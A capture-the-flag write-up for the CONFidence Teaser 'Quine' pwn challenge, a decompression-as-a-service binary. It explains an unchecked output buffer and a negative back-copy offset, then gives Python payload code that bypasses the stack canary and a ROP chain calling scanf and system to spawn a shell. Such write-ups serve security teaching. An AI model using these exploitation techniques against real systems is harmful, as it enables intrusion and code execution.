# CONFidence CTF Teaser Quine

**Category:** Pwning
**Points:** 400
**Solves:** 19
**Description:**

> Yo Dawg! I herd you like compression!
>
> Files: [quine](quine) [libc.so.6](libc.so.6)
>
> Running at 95.138.166.12:31337


## Write-up

You are provided with a binary that implements decompression-as-a-service with a simple custom data format. The decompression appends data to the output buffer either by taking a literal byte from the input stream, or reusing a slice of the output buffer.

As far as protection goes, we have ASLR and NX, but no PIE. We also have `system()@plt` in the binary, which helps.

There are two vulnerabilities that lead to a working exploit, both of which are in the decoder:
* Output buffer size is never checked -- it's trivial to cause an overflow;
* Reusing the slice of output allows for negative offsets, copying data backwards into the array.

Decompiled function is as follows:
```C
size_t __cdecl decode_buf(char *res, int reslim /* BUG: never used */, char *inp, int inplim) {
  size_t i; // [sp+14h] [bp-24h]@1
  int back_idx; // [sp+1Ch] [bp-1Ch]@9
  int copy_len; // [sp+20h] [bp-18h]@9
  bitstream input; // [sp+24h] [bp-14h]@1

  bitstream_constructor(&input, inp, inplim);
  i = 0;
  while ( num_bits_left(&input) != 0 ) {
    if ( extract_bits(&input, 1u) )  {
      if ( num_bits_left(&input) <= 7 )
        die("Invalid input buffer");
      res[i++] = extract_bits(&input, 8u);
    } else {
      if ( num_bits_left(&input) == 0 )
        die("Invalid input buffer");
      if ( extract_bits(&input, 1u) == 0 )      // terminating cond
        return i;
      back_idx = extract_varint(&input);
      copy_len = extract_varint(&input);
      if ( &res[i - back_idx - 1] < res )
        die("Invalid input buffer");
      if ( copy_len > i )
        die("Invalid input buffer");
      memcpy(&res[i], &res[i - back_idx - 1], copy_len);  // BUG: back_idx can be negative
      i += copy_len;
    }
  }
  return i;
}
```

In the calling code, the stack frame looks like the following:
```C
  char output_smashable[2048]; // [sp+2Bh] [bp-2005h]@7
  char input_stream[1024]; // [sp+82Bh] [bp-1805h]@7
  char __unused__[2049]; // [sp+102Bh] [bp-1005h]@3
  int canary; // [sp+202Ch] [bp-4h]@1
```

The complication is that if we try to smash the output buffer, we will trash the input stream which will affect the decoding process. In effect, some data will be doubly decoded (almost like a quine).

So, the plan of attack was to send a message that decodes to ROP, then the quiny bit, then a sequence of copies that smashes the buffer, then a copy operation that overwrites the next few instructions with the quiny bit.

In turn, the quiny bit needs to do the prep work for getting past the canary and copying the ROP chain. Then it can return, triggering the ROP.

We've reserved 200 bytes for ROP, 200 bytes for the quiny bit, and tried to smash the stack leading to a close-enough alignment so that a copy of the quiny payload would overwrite the current instructions. With trial and error, we got a payload to write 2541 bytes before an overlap occurs:

```python
for c in ROP + CODE:                                                             
  literal(ord(c))                                                                
literal(0)                                                                       
for i in xrange(11):                                                             
  i = 2**i                                                                       
  copy(i-1, i)                                                                   
                                                                                 
for i in xrange(3):                                                              
  literal(0x41)                                                                  
copy(255, 80)                                                                    
```

Cool, so now we can copy the `CODE` (quiny) bytes forward.

```python
copy(2541-202, 100)
```

We have chosen our payload thus far to generate an even number of bytes (multiple-of-8 bits for the compressed sequence so far) so that the overwrite lines up nicely. It's 491 bytes, 0 bits long right after this poing. Execution will continue in the quiny `CODE` bit. This is why it had to be doubly-compressed as mentioned above.

Now, what should `CODE` do? Well, we're still unpacking from the inside of our input buffer, and we have a lot of bytes to smash. We had trouble aligning the first few instructions, but the following seemed to align the quine execution and smash the stack adequately:
```python
for i in xrange(4):
  literal(0xff)  # encodes to 28 x 1-bits
literal(0x41)                                                                    
literal(0x42)                                                                    
literal(0x43)                                                                    
literal(0x44)                                                                    
# n=2639 bytes overwritten from beginning of output buffer so far
copy(2000, 1024*3 - 2639)                                                        
# n=3072                                                                         
copy(2048, 2048)                                                                 
copy(4096, 3072)                                                                 
# n=8192                                                                         
literal(0x41)                                              

# We are now at the canary. One more literal(0x41) causes a stascksmash abort.
```

To bypass the canary, we use the second bug:
```python
copy(0xffffffff, 4)  # canary                                                    
skip = 12   # saved regs and 16-byte align, whatever
for i in xrange(skip):                                                           
  literal(0x43)                                                                  
copy(8192+4+skip, 200)  # rop
```

The offset for the last `copy()` is calculated by taking number of bytes copied so far, since ROP starts at offset 0. We can now ROP freely.

The ropchain isn't pretty, and it has a lot of shamanism. `fgets()` crashed reliably, don't know why, so we copied in a `"sh\0\0"` with `scanf("%u")`. Also, the chain had to be padded with a bunch of `A`s, otherwise the decoder shits itself. If anyone can explain why, please edit this writeup adding a note below.

```python
FGETS = 0x080486c0  # unused                                                     
STDIN = 0x0804b060  # unused                                                     
SCANF = 0x08048700                                                               
SYSTEM = 0x080486a0                                                              
EXIT = 0x08048790                                                                
FMT = 0x0804901b  # "%u"                                                         
BUF = 0x0804b100  # something writeable                                          
BUMP_ESP = 0x0804864e  # add esp, 0x08 ; pop ebx ; ret  ;                        

ROP = ''                                                                         
ROP += pack('IIII', SCANF, BUMP_ESP, FMT, BUF) + "ABCD"                          
ROP += pack('III', SYSTEM, EXIT, BUF)                                            
ROP += pack('II', 0, 0)                                                          
ROP = ROP.ljust(170, '\0')                                                       
ROP = ROP.ljust(200, 'A')                                                        
```

Running this, we get a shell and after a `cat /*/*/*flag*`, we get `DrgnS{n0w_y0u_c4n_d3compr3ss_wh1Ie_u_dec0mpreSS}`. Cute.

The full exploit is also in the repo with a traffic log. Enjoy.

## Other write-ups and resources

* none yet
